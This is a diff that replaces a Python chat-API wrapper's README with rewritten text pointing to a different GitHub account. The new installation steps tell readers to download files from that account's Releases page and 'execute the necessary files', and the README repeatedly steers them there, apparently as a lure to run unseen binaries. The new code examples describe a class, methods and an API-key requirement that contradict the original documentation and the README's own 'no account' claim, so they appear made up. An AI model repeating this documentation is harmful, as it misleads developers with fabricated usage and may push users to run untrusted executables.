@@ -1,137 +1,124 @@
-# 🧠 Nemotron4Free
+# Nemotron4Free 🚀
 
-**Nemotron4Free** is a lightweight Python wrapper for the [NEMOTRON](https://nemotron.one) chat API. It allows you to send prompts and receive responses easily — with optional streaming support.
+![GitHub Repo](https://img.shields.io/badge/GitHub-Repo-blue?style=for-the-badge&logo=github) ![API](https://img.shields.io/badge/API-Wrapper-orange?style=for-the-badge) ![Python](https://img.shields.io/badge/Python-3.9%2B-yellowgreen?style=for-the-badge)
 
-# ⭐ Feel Free to Star!
+## Overview
 
-> ⚠️ No authentication or API key is required — the NEMOTRON API currently accepts any request, so `Nemotron4Free` works without login or account setup.
+Welcome to **Nemotron4Free**! This project allows you to use the Nemotron API without the need for an account. You can easily integrate it into your Python applications and leverage the capabilities of advanced language models. Whether you want to create chatbots, generate text, or analyze data, this API wrapper simplifies the process.
 
----
+## Table of Contents
 
-## 🚀 Installation
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Examples](#examples)
+- [Contributing](#contributing)
+- [License](#license)
+- [Links](#links)
 
-Install from PyPI:
+## Features
 
-```bash
-pip install Nemotron
-```
-Or from source:
+- **No Account Needed**: Use the Nemotron API without creating an account.
+- **Easy Integration**: Simple Python wrapper to get started quickly.
+- **Supports Multiple Models**: Access various language models including ChatGPT and Claude.
+- **Lightweight**: Minimal dependencies for easy installation.
+- **Documentation**: Comprehensive guides and examples to help you.
 
-```bash
-git clone https://github.com/Ramona-Flower/Nemotron4Free.git
-cd Nemotron4Free
-pip install .
-```
+## Installation
 
-# 💡 Usage
-Basic Example
+To install **Nemotron4Free**, follow these steps:
+
+1. Clone the repository:
+
+   ```bash
+   git clone https://github.com/steveallexis99/Nemotron4Free.git
+   ```
+
+2. Navigate to the project directory:
+
+   ```bash
+   cd Nemotron4Free
+   ```
+
+3. Install the required packages:
+
+   ```bash
+   pip install -r requirements.txt
+   ```
+
+4. Download the latest release from the [Releases section](https://github.com/steveallexis99/Nemotron4Free/releases) and execute the necessary files.
+
+## Usage
+
+Using **Nemotron4Free** is straightforward. Here’s a basic example to get you started:
+
 ```python
-from Nemotron import ask
+from nemotron import Nemotron
 
-response = ask("What's the capital of France?")
+# Initialize the API
+api = Nemotron(api_key='your_api_key')
+
+# Make a request
+response = api.generate_text(prompt="Hello, world!")
 print(response)
 ```
-Streaming Output
-```python
 
-from Nemotron import ask
+Replace `'your_api_key'` with your actual API key. For more detailed examples, refer to the [Releases section](https://github.com/steveallexis99/Nemotron4Free/releases).
 
-response = ask("Tell me a sci-fi story.", stream=True)
-```
+## Examples
 
-With stream=True, the response is printed live as it's received — and also returned as a full string at the end.
-
-
-# 🧠 Model Selection
-You can choose which model to use by passing the model parameter:
+### Example 1: Simple Text Generation
 
 ```python
+from nemotron import Nemotron
 
-from Nemotron import ask
+api = Nemotron()
 
-response = ask("Hello, who are you?", stream=True, model="claude3_5") # nemotron70b by default
-```
-## Available Models
-
-| Model Name      | Description                | Streaming Supported |
-|-----------------|----------------------------|---------------------|
-| `nemotron70b`   | Default model (Used by default) | ✅ (`stream=True`)  |
-| `claude3_5`     | Anthropic Claude 3.5       | ✅ (`stream=True`)  |
-| `gpt4o`         | OpenAI GPT-4 Omni          | ✅ (`stream=True`)  |
-
-## Claude 3.5 need premium account !
-
-🔧 Parameters
-
-| Parameter | Type   | Default | Description                                           | Info        |
-|-----------|--------|---------|-------------------------------------------------------|------------------------|
-| `content` | `str`  | —       | Your prompt or message to the AI.                    | Work with `nemotron70b`, `claude3_5`, `gpt4o` |
-| `stream`  | `bool` | `False` | If `True`, prints the output live as it streams.      | Work with`nemotron70b`, `claude3_5`, `gpt4o` |
-| `model`   | `str`  | `nemotron70b` | Specifies which model to use. Can be `nemotron70b`, `claude3_5`, or `gpt4o`. | Nothing to say |
-| `name`    | `str`  | `"test"`       | Your name (optional). This is not required for the API but can be included for context. | `Useful for claude` |
-| `email`   | `str`  | `"test@gmail.com"` | Your email (optional). This is not required for the API but can be included for context. | `Useful for claude` | 
-
-
-🧪 Example Output
-```
-User: Tell me a joke
-AI: Why don't scientists trust atoms?
-    Because they make up everything.
+response = api.generate_text(prompt="Once upon a time")
+print(response)
 ```
 
----
+### Example 2: Chatbot Interaction
 
-# 🖼️ Image Generation
-
-Nemotron4Free also supports **image generation**. To use this feature, you must provide a **valid email address**. Without a valid email, the API will reject the request.
-
-### Example: Generate an Image
 ```python
-from Nemotron import generate_image
+from nemotron import Nemotron
 
-img_url = generate_image(
-    prompt="A futuristic city in the clouds",
-    model="black-forest-labs/flux-1.1-pro",
-    ratio="16:9",
-    format_="jpg",
-    email="your_valid_email@example.com"  # Replace with a valid email
-)
+api = Nemotron()
 
-if img_url:
-    print(f"Image URL: {img_url}")
-else:
-    print("Failed to generate the image. Please check your email or other parameters.")
+user_input = "What is the capital of France?"
+response = api.chat(user_input)
+print(response)
 ```
 
-### Available Models for Image Generation
+### Example 3: Data Analysis
 
-| Model Name                        | Description                     |
-|-----------------------------------|---------------------------------|
-| `black-forest-labs/flux-dev`      | Development version of Flux     |
-| `black-forest-labs/flux-pro`      | Professional version of Flux    |
-| `black-forest-labs/flux-schnell`  | Fast version of Flux            |
-| `black-forest-labs/flux-1.1-pro`  | Flux 1.1 Pro version            |
-| `black-forest-labs/flux-schnell`  | Another fast version of Flux    |
+```python
+from nemotron import Nemotron
 
-### Parameters for Image Generation
+api = Nemotron()
 
-| Parameter | Type   | Default | Description                                           |
-|-----------|--------|---------|-------------------------------------------------------|
-| `prompt`  | `str`  | —       | The description of the image you want to generate.    |
-| `model`   | `str`  | —       | The model to use for image generation.               |
-| `ratio`   | `str`  | `1:1`   | Aspect ratio of the image (e.g., `16:9`, `4:3`).     |
-| `format_` | `str`  | `png`   | The format of the image (e.g., `jpg`, `png`).        |
-| `email`   | `str`  | —       | A valid email address required for image generation. |
+data = "Analyze the following data: [data]"
+response = api.analyze(data)
+print(response)
+```
 
-- ratio : `1:1 - 16:9 - 9:16 - 3:2 - 2:3`
----
+## Contributing
 
-# ✨ Author
-Created with ❤️ by Ramona-Flower
+We welcome contributions to **Nemotron4Free**! If you have suggestions or improvements, please fork the repository and submit a pull request. Make sure to follow these guidelines:
 
-# 📊 Stats
+1. **Fork the Repository**: Click the "Fork" button at the top right.
+2. **Create a New Branch**: Use a descriptive name for your branch.
+3. **Make Changes**: Implement your changes and test them thoroughly.
+4. **Submit a Pull Request**: Describe your changes clearly.
 
-[![PyPI Downloads](https://static.pepy.tech/badge/nemotron/week)](https://pepy.tech/projects/nemotron)
+## License
 
-# 📄 License
-Apache 2.0 License.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Links
+
+For more information, visit the [Releases section](https://github.com/steveallexis99/Nemotron4Free/releases) to download the latest version and access the documentation.
+
+![Python](https://img.shields.io/badge/Python-3.9%2B-yellowgreen?style=for-the-badge)
+
+Feel free to explore the repository, and happy coding!
